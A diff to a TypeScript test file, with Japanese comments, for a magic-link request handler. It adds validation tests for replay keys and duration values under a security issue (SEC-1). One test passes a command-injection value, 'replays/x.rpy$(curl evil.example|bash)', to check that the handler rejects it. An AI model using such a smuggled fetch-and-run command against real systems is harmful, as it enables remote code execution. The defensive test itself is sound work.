@@ -32,6 +32,10 @@ const REQUIRED_ENV: Record<string, string> = {
 const ddbMock = mockClient(DynamoDBDocumentClient);
 const sesMock = mockClient(SESv2Client);
 
+// createPresignedUpload()（`uploads.ts`）が払い出す形式(`REPLAY_KEY_PATTERN`)に
+// 合わせたテスト用のキー。SEC-1対応後は入口検証を通らないと202まで到達しない。
+const VALID_REPLAY_KEY = "replays/123e4567-e89b-12d3-a456-426614174000.rpy";
+
 function makeEvent(body: unknown): APIGatewayProxyEventV2 {
   return { body: JSON.stringify(body), isBase64Encoded: false } as APIGatewayProxyEventV2;
 }
@@ -62,7 +66,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
       }),
@@ -80,7 +84,7 @@ describe("POST /magic-links", () => {
     expect(jobPut?.args[0].input.Item).toMatchObject({
       status: "pending",
       email: "user@example.com",
-      replayKey: "replays/abc.rpy",
+      replayKey: VALID_REPLAY_KEY,
       language: "ja", // 未指定時は既定言語(ja)
     });
     expect(jobPut?.args[0].input.ConditionExpression).toBe("attribute_not_exists(jobId)");
@@ -98,7 +102,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
         language: "en",
@@ -122,7 +126,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
         language: "fr",
@@ -152,7 +156,7 @@ describe("POST /magic-links", () => {
     };
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
         replayInfo,
@@ -177,7 +181,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
       }),
@@ -194,7 +198,7 @@ describe("POST /magic-links", () => {
   it("email の形式が不正なら400を返しメールを送らない", async () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
-      makeEvent({ replayKey: "replays/abc.rpy", options: { watermark: true }, email: "not-an-email" }),
+      makeEvent({ replayKey: VALID_REPLAY_KEY, options: { watermark: true }, email: "not-an-email" }),
       {} as never,
       () => {},
     );
@@ -213,11 +217,77 @@ describe("POST /magic-links", () => {
     expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(400);
   });
 
+  it("replayKey がサーバー採番の形式(replays/<uuid>.rpy)でなければ400を返しメールを送らない（Issue #127 SEC-1）", async () => {
+    const { handler } = await import("./requestMagicLink.js");
+    const res = await handler(
+      makeEvent({
+        replayKey: "replays/x.rpy$(curl evil.example|bash)",
+        options: { watermark: true },
+        email: "user@example.com",
+      }),
+      {} as never,
+      () => {},
+    );
+    const result = res as APIGatewayProxyStructuredResultV2;
+    expect(result.statusCode).toBe(400);
+    expect(parseBody(result)).toMatchObject({ code: "invalid_replay_key" });
+    expect(ddbMock.commandCalls(PutCommand)).toHaveLength(0);
+    expect(sesMock.commandCalls(SendEmailCommand)).toHaveLength(0);
+  });
+
+  it("estimatedDurationSeconds が数値でない・0以下なら400を返す（Issue #127 SEC-1）", async () => {
+    const { handler } = await import("./requestMagicLink.js");
+    // NaN/Infinity は通常のJSでの値としてはJSON.stringifyがnullへ潰してしまうため
+    // ここでは検証できない(=nullは許容値なので意味のあるケースにならない)。
+    // 巨大指数(1e400)のように「JSON構文としては有効だがパース結果がInfinityになる」
+    // 値はNumber.isFinite側のケースとして別テストで検証する。
+    for (const invalid of [-1, 0, "900"]) {
+      const res = await handler(
+        makeEvent({
+          replayKey: VALID_REPLAY_KEY,
+          options: { watermark: true },
+          email: "user@example.com",
+          estimatedDurationSeconds: invalid,
+        }),
+        {} as never,
+        () => {},
+      );
+      const result = res as APIGatewayProxyStructuredResultV2;
+      expect(result.statusCode).toBe(400);
+    }
+    expect(ddbMock.commandCalls(PutCommand)).toHaveLength(0);
+  });
+
+  it("estimatedDurationSeconds がJSON上は数値でもパース結果がInfinityなら400を返す", async () => {
+    const { handler } = await import("./requestMagicLink.js");
+    const event = {
+      body: `{"replayKey":"${VALID_REPLAY_KEY}","options":{"watermark":true},"email":"user@example.com","estimatedDurationSeconds":1e400}`,
+      isBase64Encoded: false,
+    } as APIGatewayProxyEventV2;
+    const res = await handler(event, {} as never, () => {});
+    expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(400);
+  });
+
+  it("estimatedDurationSeconds が未指定・nullなら受け付ける", async () => {
+    const { handler } = await import("./requestMagicLink.js");
+    const res = await handler(
+      makeEvent({
+        replayKey: VALID_REPLAY_KEY,
+        options: { watermark: true },
+        email: "user@example.com",
+        estimatedDurationSeconds: null,
+      }),
+      {} as never,
+      () => {},
+    );
+    expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(202);
+  });
+
   it("非対応タイトルなら422を返す", async () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         game: "th13",
         options: { watermark: true },
         email: "user@example.com",
@@ -234,7 +304,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         game: "th20",
         options: { watermark: true, slowMotion: true },
         email: "user@example.com",
@@ -255,7 +325,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         game: "th07",
         options: { watermark: true, slowMotion: true },
         email: "user@example.com",
@@ -277,7 +347,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
       }),
@@ -294,7 +364,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
       }),
@@ -311,7 +381,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
       }),
@@ -336,7 +406,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
       }),
@@ -378,7 +448,7 @@ describe("POST /magic-links", () => {
     const { handler } = await import("./requestMagicLink.js");
     const res = await handler(
       makeEvent({
-        replayKey: "replays/abc.rpy",
+        replayKey: VALID_REPLAY_KEY,
         options: { watermark: true },
         email: "user@example.com",
       }),
